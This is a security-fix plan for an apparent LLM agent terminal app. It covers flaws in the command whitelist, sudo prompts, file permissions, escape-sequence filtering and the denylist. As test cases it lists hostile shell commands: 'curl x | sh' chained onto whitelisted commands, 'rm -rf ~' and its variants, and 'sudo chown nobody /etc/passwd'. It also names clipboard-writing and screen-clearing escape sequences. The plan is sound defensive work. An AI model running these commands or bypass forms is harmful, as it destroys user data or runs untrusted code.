# Security Fixes Plan - 2026-10-17

Source: `docs/reviews/2026-10-17-codebase-audit.md`, section 1.

In scope: S1, S3, S4, S5, S6, S7. Out of scope: S2 and S8 (marked as not issues in the audit).

All work goes on one branch off `main` and ships as one PR.

## Decisions

| Question | Decision |
|---|---|
| Commands with shell operators always prompt, even with a whitelisted prefix | Yes |
| Cached sudo password for whitelisted sudo commands | Keep current behavior: use the cache without asking |
| Escape sequences in tool output | Strip all of them, including colors |
| S3 scope | All four fixes |
| PRs | One PR for all items |

## Order of work

1. S1
2. S3
3. S4
4. S6
5. S5
6. S7

S4 depends on S1. The guard fixes (S1, S3, S4) come first because they matter most.

## Method for each item

1. Write a failing test that reproduces the bug.
2. Fix the bug.
3. Run `go test ./gohome/...`, `go vet ./gohome/...` and `golangci-lint run ./gohome/...`.

---

## S1. Whitelisted commands can be chained (Critical)

**Problem:** A whitelist entry only checks how a command starts. `git status; curl x | sh` passes because it starts with `git status`. `ls` also matches `lsof`.

**Fix:**
1. **Block shell operators.** If a command contains any of `;`, `&`, `|`, a newline, a backtick, `$(`, `>` or `<`, the whitelist never auto-approves it. The user gets the normal approval prompt instead. This covers every whitelist entry, including old entries already saved in files.
2. **Match whole words.** A pattern must end at a space or at the end of the command. `ls` matches `ls -la` but not `lsof`.

**Trade-off:** Harmless commands such as `grep "a|b" file` will now prompt. This was accepted.

**Files:** `guard/compile.go` (pattern compile and `Allows`).

**Tests:** every evidence case from the audit (`git status; curl x | sh`, `git status` followed by a newline and `rm -rf ~`, `git status $(id)`, `lsof; id`, `ls && id`) must not be whitelisted. `ls -la` and `git status -s` must still be whitelisted.

## S3. "Allow always" can whitelist everything (High)

**Problems and fixes:**
1. **Empty pattern.** Clearing the pattern box and pressing Enter saves an empty pattern that matches every command. Fix: reject an empty or whitespace-only pattern, both in the approval dialog (show an error) and in the guard when saving.
2. **`^sudo` suggestion.** For `sudo apt install x`, the suggestion is `^sudo`, which pre-approves all sudo commands. Fix: for sudo commands, suggest the full command.
3. **Special characters are not escaped.** `./build.sh` also matches `./build.shred`. `c++` is an invalid regex that is written to the file but never works. Fix: escape special characters in suggested patterns. When the user edits a pattern by hand, check that it is a valid regex before saving, and show an error if it is not.
4. **Duplicates.** `^ls` and `ls` can both be saved. Fix: store every pattern in one consistent form so duplicate checks agree in memory and in the file.

**Files:** `guard/suggest.go`, `guard/persist.go`, `tui/model_approval.go`.

**Tests:** empty pattern rejected; sudo suggestion is not `^sudo`; `./build.sh` suggestion does not match `./build.shred`; invalid regex is not saved; the same rule is not written twice.

## S4. Whitelist plus sudo runs as root with little or no prompt (High)

**Problem:** `git status; sudo chown nobody /etc/passwd` counted as whitelisted and only asked for the password, or nothing if the password cache was on. The password dialog shows only 3 lines of the command.

**Fix:**
1. The S1 fix closes the main hole. A chained command is no longer whitelisted, so it gets the full approval prompt.
2. The password-only dialog lets the user expand the full command with `v`, as the normal approval prompt does.
3. The cached password is still used without asking for whitelisted sudo commands (decision above).

**Files:** `tui/approval.go`, `tui/model_approval.go`.

**Tests:** the audit evidence command is no longer allowed by the whitelist; the password dialog shows all lines after `v`.

## S6. Secret files can be read by other users (Medium)

**Problem:** The setup wizard writes `settings.json` (which may contain an API key) readable by other users. Save errors are hidden.

**Fix:**
1. Write `settings.json`, the skeleton config and the scaffolded denylist with owner-only permissions (file `0600`, new folders `0700`).
2. If saving fails, the wizard shows the error and stays on the current step.
3. Existing files keep their current permissions. They are not changed.

**Files:** `tui/config_wizard.go`, `config/skeleton.go`.

**Tests:** written files have mode `0600` (skipped on Windows); a failed save shows an error and does not move the wizard forward.

## S5. Escape sequences from untrusted text reach the terminal (High)

**Problem:** Text from the LLM, tools or files can contain hidden control codes that write to the clipboard, clear the screen or fake output.

**Fix:**
1. Add a strict sanitizer that removes all escape sequences and control characters except newline and tab. This includes colors.
2. Apply it once, where the TUI receives agent events: assistant text, thinking, tool output and diff content.
3. The app's own styling is added after this step, so it still works.
4. The existing `StripAnsi` helper misses some sequence types (audit R10), so it is not reused for this.

**Files:** new sanitizer in `tui/`, applied in `tui/model_agent.go` and `tui/diff.go`.

**Tests:** OSC 52 (clipboard write), CSI 2J (clear screen), BEL-terminated OSC and color codes do not appear in `Model.View()`; newlines and tabs are kept. Update golden snapshots if needed.

## S7. The denylist is easy to bypass (Medium)

**Problem:** The denylist uses plain text matching. `rm -fr /`, `rm -r -f /`, `rm  -rf /`, `rm -rf "/"` and `rm -rf ~` are not blocked. `rm -rf /tmp/build` and `echo mkfs` are wrongly blocked.

**Fix:**
1. Replace the built-in plain-text entries with patterns that handle flag order, quotes and `~`. The targets `/` and `~` must stand alone, so `/tmp/build` is not blocked.
2. Before matching, squeeze repeated spaces into one.
3. The setup wizard reuses the built-in list instead of its own copy.
4. Document in the README that the denylist is a safety net, not a sandbox, and that it applies in yolo mode.
5. Not in scope: extending the denylist to the write and edit tools.

**Note:** Users who already have a `denylist.json` keep their old entries. Only new setups get the new patterns.

**Files:** `guard/defaults.go`, `guard/denylist.go`, `tui/config_wizard.go`, `README.md`.

**Tests:** every bypass case from the audit is denied; `rm -rf /tmp/build` is allowed.

---

## Finish

1. Run the full test suite, vet and lint.
2. Update `docs/reviews/2026-10-17-codebase-audit.md` to mark S1, S3, S4, S5, S6 and S7 as fixed.
3. Open one PR against `main`.
